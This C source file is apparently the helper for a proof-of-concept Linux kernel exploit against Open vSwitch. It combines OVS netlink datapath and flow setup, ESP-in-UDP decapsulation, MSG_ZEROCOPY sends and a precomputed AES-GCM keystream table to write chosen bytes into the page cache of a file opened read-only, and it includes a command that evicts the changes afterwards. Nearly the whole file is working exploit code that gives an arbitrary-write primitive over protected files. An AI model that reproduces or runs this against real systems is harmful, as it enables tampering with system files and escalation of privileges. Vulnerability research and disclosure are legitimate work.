// poc.c — helper for the openvswitch SKBFL_SHARED_FRAG strip PoC (driven by the scripts).
//   poc ovs dp|vport <if>|flow   minimal OVS control (autoloads the module)
//   poc encap                    arm udp/4500 for ESP-in-UDP decap, then idle
//   poc writex <file> <off> <ip> <hex>   chosen page-cache write of <hex> at <off>
//   poc evict  <file>            drop the modified (never-dirtied) pages -> restore on disk
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/genetlink.h>
#include <linux/netlink.h>
#include <linux/openvswitch.h>
#include <linux/udp.h> /* UDP_ENCAP, UDP_ENCAP_ESPINUDP */
#include <net/if.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <unistd.h>

#ifndef SO_ZEROCOPY
#define SO_ZEROCOPY 60
#endif
#ifndef MSG_ZEROCOPY
#define MSG_ZEROCOPY 0x4000000
#endif

/* ================================ OVS control =============================== */
#define UNBOUND_PID 0x7ffffff0u /* portid with no bound socket -> upcall -ECONNREFUSED */

static int      nl_sk;
static unsigned nl_portid;
static char     nl_buf[16384];

static void* nla_put_(void* p, int type, const void* d, int len) {
    struct nlattr* a = p;
    a->nla_type      = type;
    a->nla_len       = NLA_HDRLEN + len;
    if (len)
        memcpy((char*)p + NLA_HDRLEN, d, len);
    memset((char*)p + NLA_HDRLEN + len, 0, NLA_ALIGN(a->nla_len) - a->nla_len);
    return (char*)p + NLA_ALIGN(a->nla_len);
}
static void* nest_open(void* p, int type, struct nlattr** save) {
    struct nlattr* a = p;
    a->nla_type      = type | NLA_F_NESTED;
    *save            = a;
    return (char*)p + NLA_HDRLEN;
}
static void* nest_close(void* p, struct nlattr* save) {
    save->nla_len = (char*)p - (char*)save;
    return p;
}

static int nl_tx(int fam, int cmd, int ver, void* payload, int plen, int flags) {
    struct nlmsghdr* nh = (void*)nl_buf;
    memset(nl_buf, 0, sizeof nl_buf);
    nh->nlmsg_len         = NLMSG_LENGTH(GENL_HDRLEN + plen);
    nh->nlmsg_type        = fam;
    nh->nlmsg_flags       = NLM_F_REQUEST | flags;
    nh->nlmsg_seq         = 1;
    nh->nlmsg_pid         = nl_portid;
    struct genlmsghdr* gh = NLMSG_DATA(nh);
    gh->cmd               = cmd;
    gh->version           = ver;
    memcpy((char*)gh + GENL_HDRLEN, payload, plen);
    struct sockaddr_nl da = {.nl_family = AF_NETLINK};
    return sendto(nl_sk, nl_buf, nh->nlmsg_len, 0, (void*)&da, sizeof da);
}
static int nl_ack(const char* what) {
    char r[16384];
    recv(nl_sk, r, sizeof r, 0);
    struct nlmsghdr* nh = (void*)r;
    if (nh->nlmsg_type == NLMSG_ERROR) {
        int e = -((struct nlmsgerr*)NLMSG_DATA(nh))->error;
        printf("    %-14s -> %s (%d)\n", what, e ? strerror(e) : "OK", e);
        return e;
    }
    printf("    %-14s -> reply\n", what);
    return 0;
}
static int nl_resolve(const char* name) {
    char  p[256];
    void* q = nla_put_(p, CTRL_ATTR_FAMILY_NAME, name, strlen(name) + 1);
    nl_tx(GENL_ID_CTRL, CTRL_CMD_GETFAMILY, 1, p, (char*)q - p, 0);
    char             r[8192];
    int              n  = recv(nl_sk, r, sizeof r, 0);
    struct nlmsghdr* nh = (void*)r;
    if (nh->nlmsg_type == NLMSG_ERROR)
        return -1;
    struct nlattr* a   = (void*)((char*)NLMSG_DATA(nh) + GENL_HDRLEN);
    int            rem = n - NLMSG_LENGTH(GENL_HDRLEN);
    for (; rem > 0 && a->nla_len >= NLA_HDRLEN && rem >= a->nla_len;
         rem -= NLA_ALIGN(a->nla_len), a = (void*)((char*)a + NLA_ALIGN(a->nla_len)))
        if ((a->nla_type & NLA_TYPE_MASK) == CTRL_ATTR_FAMILY_ID)
            return *(uint16_t*)((char*)a + NLA_HDRLEN);
    return -1;
}

static int cmd_ovs(int argc, char** argv) {
    if (argc < 3) {
        fprintf(stderr, "usage: poc ovs dp|vport <if>|flow\n");
        return 2;
    }
    nl_sk                 = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
    struct sockaddr_nl la = {.nl_family = AF_NETLINK};
    bind(nl_sk, (void*)&la, sizeof la);
    socklen_t ll = sizeof la;
    getsockname(nl_sk, (void*)&la, &ll);
    nl_portid = la.nl_pid;

    int F_DP = nl_resolve("ovs_datapath"); /* also autoloads the module */
    int F_VP = nl_resolve("ovs_vport");
    int F_FL = nl_resolve("ovs_flow");
    if (F_DP < 0) {
        fprintf(stderr, "openvswitch genl families unavailable\n");
        return 4;
    }

    char              p[8192];
    void*             q;
    struct ovs_header oh;
    unsigned          u;
    struct nlattr *   n1, *n2, *n3;
    const char*       sub = argv[2];

    if (!strcmp(sub, "dp")) {
        memset(&oh, 0, sizeof oh);
        q = p;
        memcpy(q, &oh, sizeof oh);
        q = (char*)q + sizeof oh;
        q = nla_put_(q, OVS_DP_ATTR_NAME, "tdp0", 5);
        u = UNBOUND_PID;
        q = nla_put_(q, OVS_DP_ATTR_UPCALL_PID, &u, 4);
        nl_tx(F_DP, OVS_DP_CMD_NEW, OVS_DATAPATH_VERSION, p, (char*)q - p, NLM_F_ACK);
        return nl_ack("DP_NEW tdp0") ? 1 : 0;
    }
    if (!strcmp(sub, "vport") && argc > 3) {
        int dpif = if_nametoindex("tdp0");
        if (!dpif) {
            fprintf(stderr, "no tdp0\n");
            return 1;
        }
        memset(&oh, 0, sizeof oh);
        oh.dp_ifindex = dpif;
        q             = p;
        memcpy(q, &oh, sizeof oh);
        q = (char*)q + sizeof oh;
        u = 1;
        q = nla_put_(q, OVS_VPORT_ATTR_PORT_NO, &u, 4);
        u = OVS_VPORT_TYPE_NETDEV;
        q = nla_put_(q, OVS_VPORT_ATTR_TYPE, &u, 4);
        q = nla_put_(q, OVS_VPORT_ATTR_NAME, argv[3], strlen(argv[3]) + 1);
        u = UNBOUND_PID;
        q = nla_put_(q, OVS_VPORT_ATTR_UPCALL_PID, &u, 4);
        nl_tx(F_VP, OVS_VPORT_CMD_NEW, OVS_VPORT_VERSION, p, (char*)q - p, NLM_F_ACK);
        return nl_ack("VPORT_NEW") ? 1 : 0;
    }
    if (!strcmp(sub, "flow")) {
        int dpif = if_nametoindex("tdp0");
        if (!dpif) {
            fprintf(stderr, "no tdp0\n");
            return 1;
        }
        struct ovs_key_ethernet ek;
        memset(&ek, 0, sizeof ek);
        struct ovs_key_ipv4 i4;
        memset(&i4, 0, sizeof i4);
        uint16_t et = htons(0x0800);
        memset(&oh, 0, sizeof oh);
        oh.dp_ifindex = dpif;
        q             = p;
        memcpy(q, &oh, sizeof oh);
        q = (char*)q + sizeof oh;
        q = nest_open(q, OVS_FLOW_ATTR_KEY, &n1);
        u = 0;
        q = nla_put_(q, OVS_KEY_ATTR_RECIRC_ID, &u, 4);
        u = 1;
        q = nla_put_(q, OVS_KEY_ATTR_IN_PORT, &u, 4);
        q = nla_put_(q, OVS_KEY_ATTR_ETHERNET, &ek, sizeof ek);
        q = nla_put_(q, OVS_KEY_ATTR_ETHERTYPE, &et, 2);
        q = nla_put_(q, OVS_KEY_ATTR_IPV4, &i4, sizeof i4);
        q = nest_close(q, n1);
        q = nest_open(q, OVS_FLOW_ATTR_MASK, &n2);
        u = 0xffffffff;
        q = nla_put_(q, OVS_KEY_ATTR_RECIRC_ID, &u, 4);
        u = 0xffffffff;
        q = nla_put_(q, OVS_KEY_ATTR_IN_PORT, &u, 4);
        memset(&ek, 0, sizeof ek);
        q = nla_put_(q, OVS_KEY_ATTR_ETHERNET, &ek, sizeof ek);
        {
            uint16_t m = 0xffff;
            q          = nla_put_(q, OVS_KEY_ATTR_ETHERTYPE, &m, 2);
        }
        memset(&i4, 0, sizeof i4);
        i4.ipv4_frag = 0xff;
        q            = nla_put_(q, OVS_KEY_ATTR_IPV4, &i4, sizeof i4);
        q            = nest_close(q, n2);
        q            = nest_open(q, OVS_FLOW_ATTR_ACTIONS, &n3);
        /* RECIRC clones the skb (clone_execute) and processes the clone;
         * recirc_id 1 matches no flow, so the clone misses and upcalls to
         * the vport's UNBOUND_PID, which fails. The clone shares shinfo with
         * the original that OUTPUT(0) then delivers locally.
         */
        u = 1;
        q = nla_put_(q, OVS_ACTION_ATTR_RECIRC, &u, 4);
        u = 0;
        q = nla_put_(q, OVS_ACTION_ATTR_OUTPUT, &u, 4); /* port 0 == internal tdp0 */
        q = nest_close(q, n3);
        nl_tx(F_FL, OVS_FLOW_CMD_NEW, OVS_FLOW_VERSION, p, (char*)q - p, NLM_F_ACK | NLM_F_CREATE);
        return nl_ack("FLOW_NEW") ? 1 : 0;
    }
    fprintf(stderr, "unknown ovs subcommand\n");
    return 2;
}

/* ================================ UDP encap ================================= */
static int cmd_encap(void) {
    int                s = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in a = {0};
    a.sin_family         = AF_INET;
    a.sin_port           = htons(4500);
    a.sin_addr.s_addr    = INADDR_ANY;
    if (bind(s, (void*)&a, sizeof a)) {
        perror("bind 4500");
        return 1;
    }
    int enc = UDP_ENCAP_ESPINUDP; /* must be set AFTER bind */
    if (setsockopt(s, IPPROTO_UDP, UDP_ENCAP, &enc, sizeof enc)) {
        perror("UDP_ENCAP");
        return 1;
    }
    printf("[encap] udp/4500 armed for ESP-in-UDP\n");
    fflush(stdout);
    pause();
    return 0;
}

/* ============================== chosen write =============================== */
/* ESP SA parameters — must match the SA the scripts install. */
static const uint32_t ESP_SPI     = 0x42434445;
static const uint8_t  AES_KEY[16] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15};
static const uint8_t  SALT[4]     = {0x11, 0x22, 0x33, 0x44};
static const long     ESP_LEN_MAX = 32; /* max ciphertext bytes/packet (1 chosen + collateral) */

/* compact AES-128 encrypt (tiny-AES-c derived) */
static const uint8_t sbox[256] = {
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16};
static const uint8_t rcon[11] = {0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36};
typedef uint8_t      state_t[4][4];
static uint8_t       RK[176];
static void          aes_key_expand(const uint8_t* Key) {
    unsigned i, j, k;
    uint8_t  t[4];
    for (i = 0; i < 4; i++) {
        RK[i * 4 + 0] = Key[i * 4 + 0];
        RK[i * 4 + 1] = Key[i * 4 + 1];
        RK[i * 4 + 2] = Key[i * 4 + 2];
        RK[i * 4 + 3] = Key[i * 4 + 3];
    }
    for (i = 4; i < 44; i++) {
        k    = (i - 1) * 4;
        t[0] = RK[k + 0];
        t[1] = RK[k + 1];
        t[2] = RK[k + 2];
        t[3] = RK[k + 3];
        if (i % 4 == 0) {
            uint8_t tmp = t[0];
            t[0]        = t[1];
            t[1]        = t[2];
            t[2]        = t[3];
            t[3]        = tmp;
            t[0]        = sbox[t[0]];
            t[1]        = sbox[t[1]];
            t[2]        = sbox[t[2]];
            t[3]        = sbox[t[3]];
            t[0] ^= rcon[i / 4];
        }
        j         = i * 4;
        k         = (i - 4) * 4;
        RK[j + 0] = RK[k + 0] ^ t[0];
        RK[j + 1] = RK[k + 1] ^ t[1];
        RK[j + 2] = RK[k + 2] ^ t[2];
        RK[j + 3] = RK[k + 3] ^ t[3];
    }
}
static uint8_t xtime(uint8_t x) {
    return (uint8_t)((x << 1) ^ (((x >> 7) & 1) * 0x1b));
}
static void AddRoundKey(uint8_t rnd, state_t* s) {
    for (uint8_t i = 0; i < 4; i++)
        for (uint8_t j = 0; j < 4; j++)
            (*s)[i][j] ^= RK[rnd * 16 + i * 4 + j];
}
static void SubBytes(state_t* s) {
    for (uint8_t i = 0; i < 4; i++)
        for (uint8_t j = 0; j < 4; j++)
            (*s)[i][j] = sbox[(*s)[i][j]];
}
static void ShiftRows(state_t* s) {
    uint8_t t;
    t          = (*s)[0][1];
    (*s)[0][1] = (*s)[1][1];
    (*s)[1][1] = (*s)[2][1];
    (*s)[2][1] = (*s)[3][1];
    (*s)[3][1] = t;
    t          = (*s)[0][2];
    (*s)[0][2] = (*s)[2][2];
    (*s)[2][2] = t;
    t          = (*s)[1][2];
    (*s)[1][2] = (*s)[3][2];
    (*s)[3][2] = t;
    t          = (*s)[0][3];
    (*s)[0][3] = (*s)[3][3];
    (*s)[3][3] = (*s)[2][3];
    (*s)[2][3] = (*s)[1][3];
    (*s)[1][3] = t;
}
static void MixColumns(state_t* s) {
    for (uint8_t i = 0; i < 4; i++) {
        uint8_t t   = (*s)[i][0];
        uint8_t all = (*s)[i][0] ^ (*s)[i][1] ^ (*s)[i][2] ^ (*s)[i][3], Tm;
        Tm          = xtime((*s)[i][0] ^ (*s)[i][1]);
        (*s)[i][0] ^= Tm ^ all;
        Tm = xtime((*s)[i][1] ^ (*s)[i][2]);
        (*s)[i][1] ^= Tm ^ all;
        Tm = xtime((*s)[i][2] ^ (*s)[i][3]);
        (*s)[i][2] ^= Tm ^ all;
        Tm = xtime((*s)[i][3] ^ t);
        (*s)[i][3] ^= Tm ^ all;
    }
}
static void aes_encrypt(const uint8_t* in, uint8_t* out) {
    state_t s;
    memcpy(&s, in, 16);
    AddRoundKey(0, &s);
    for (uint8_t r = 1; r < 10; r++) {
        SubBytes(&s);
        ShiftRows(&s);
        MixColumns(&s);
        AddRoundKey(r, &s);
    }
    SubBytes(&s);
    ShiftRows(&s);
    AddRoundKey(10, &s);
    memcpy(out, &s, 16);
}
static void be32(uint8_t* p, uint32_t v) {
    p[0] = v >> 24;
    p[1] = v >> 16;
    p[2] = v >> 8;
    p[3] = v;
}

/* first GCM keystream byte for a given IV: AES_K(salt || iv || be32(2))[0] */
static uint8_t keystream0(const uint8_t iv[8]) {
    uint8_t cb[16], out[16];
    memcpy(cb, SALT, 4);
    memcpy(cb + 4, iv, 8);
    be32(cb + 12, 2);
    aes_encrypt(cb, out);
    return out[0];
}
static uint16_t nonce_for[256]; /* keystream-byte -> IV nonce that produces it */
static void     build_iv_table(void) {
    uint8_t seen[256] = {0}, iv[8];
    memset(iv, 0xcc, 8);
    int cnt = 0;
    for (uint32_t n = 0; n <= 0xffff && cnt < 256; n++) {
        be32(iv + 4, n);
        uint8_t b = keystream0(iv);
        if (!seen[b]) {
            seen[b]      = 1;
            nonce_for[b] = (uint16_t)n;
            cnt++;
        }
    }
    if (cnt != 256) {
        fprintf(stderr, "IV table incomplete (%d/256)\n", cnt);
        exit(2);
    }
}

/* Write @want (wlen bytes) at @off of @path via in-place ESP-GCM decrypt over the file's
 * page cache. Only the first byte of each packet is chosen; walk left-to-right and cap the
 * payload to (wlen-i) so nothing outside [off, off+wlen) is ever touched. */
static int cmd_writex(int argc, char** argv) {
    if (argc < 6) {
        fprintf(stderr, "usage: poc writex <file> <off> <dst-ip> <hex>\n");
        return 2;
    }
    const char* path = argv[2];
    long        off  = atol(argv[3]);
    const char* dst  = argv[4];
    const char* hex  = argv[5];
    size_t      hl   = strlen(hex);
    if (hl % 2) {
        fprintf(stderr, "hex length must be even\n");
        return 2;
    }
    size_t   wlen = hl / 2;
    uint8_t* want = malloc(wlen ? wlen : 1);
    for (size_t i = 0; i < wlen; i++) {
        unsigned b;
        if (sscanf(hex + 2 * i, "%2x", &b) != 1) {
            fprintf(stderr, "bad hex\n");
            return 2;
        }
        want[i] = (uint8_t)b;
    }

    aes_key_expand(AES_KEY);
    build_iv_table();

    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 2;
    }
    long     pbase = off & ~0xfffL;
    size_t   mlen  = ((size_t)(off + wlen + ESP_LEN_MAX) - pbase + 0x2000) & ~0xfffL;
    uint8_t* map   = mmap(NULL, mlen, PROT_READ, MAP_SHARED, fd, pbase);
    if (map == MAP_FAILED) {
        perror("mmap");
        return 2;
    }

    int s = socket(AF_INET, SOCK_DGRAM, 0), one = 1;
    if (setsockopt(s, SOL_SOCKET, SO_ZEROCOPY, &one, sizeof one) < 0) {
        perror("SO_ZEROCOPY");
        return 2;
    }
    setsockopt(s, SOL_SOCKET, SO_NO_CHECK, &one, sizeof one); /* keep ip_summed=NONE */
    struct sockaddr_in sa = {0};
    sa.sin_family         = AF_INET;
    sa.sin_port           = htons(4500);
    sa.sin_addr.s_addr    = inet_addr(dst);

    uint32_t seq = 1;
    for (size_t i = 0; i < wlen; i++) {
        long    X   = off + i;
        uint8_t cur = 0;
        if (pread(fd, &cur, 1, X) < 0) {
            perror("pread");
            return 2;
        } /* cache reflects prior writes */
        if (cur == want[i])
            continue; /* already correct */

        long esp_len = (long)(wlen - i);
        if (esp_len > ESP_LEN_MAX)
            esp_len = ESP_LEN_MAX;

        uint8_t iv[8];
        memset(iv, 0xcc, 8);
        be32(iv + 4, nonce_for[cur ^ want[i]]);
        uint8_t esp_hdr[16], icv[16] = {0};
        be32(esp_hdr + 0, ESP_SPI);
        be32(esp_hdr + 4, seq++);
        memcpy(esp_hdr + 8, iv, 8);

        struct iovec iov[3] = {
            {esp_hdr, 16},                /* owned */
            {map + (X - pbase), esp_len}, /* FOREIGN page-cache page */
            {icv, 16},                    /* owned */
        };
        struct msghdr mh = {
            .msg_name = &sa, .msg_namelen = sizeof sa, .msg_iov = iov, .msg_iovlen = 3};
        if (sendmsg(s, &mh, MSG_ZEROCOPY) < 0)
            fprintf(stderr, "sendmsg off %ld: %s\n", X, strerror(errno));
        usleep(30000);
    }
    return 0;
}

/* Drop the modified (never-dirtied) pages so the next read pulls clean bytes from disk. */
static int cmd_evict(int argc, char** argv) {
    if (argc < 3) {
        fprintf(stderr, "usage: poc evict <file>\n");
        return 2;
    }
    int fd = open(argv[2], O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 2;
    }
    struct stat st;
    if (fstat(fd, &st)) {
        perror("fstat");
        return 2;
    }
    if (posix_fadvise(fd, 0, st.st_size, POSIX_FADV_DONTNEED)) {
        perror("fadvise");
        return 2;
    }
    printf("[+] evicted page cache for %s -> on-disk content restored\n", argv[2]);
    return 0;
}

int main(int argc, char** argv) {
    if (argc >= 2 && !strcmp(argv[1], "ovs"))
        return cmd_ovs(argc, argv);
    if (argc >= 2 && !strcmp(argv[1], "encap"))
        return cmd_encap();
    if (argc >= 2 && !strcmp(argv[1], "writex"))
        return cmd_writex(argc, argv);
    if (argc >= 2 && !strcmp(argv[1], "evict"))
        return cmd_evict(argc, argv);
    fprintf(stderr, "usage:\n"
                    "  poc ovs dp|vport <if>|flow\n"
                    "  poc encap\n"
                    "  poc writex <file> <off> <dst-ip> <hex>\n"
                    "  poc evict  <file>\n");
    return 2;
}
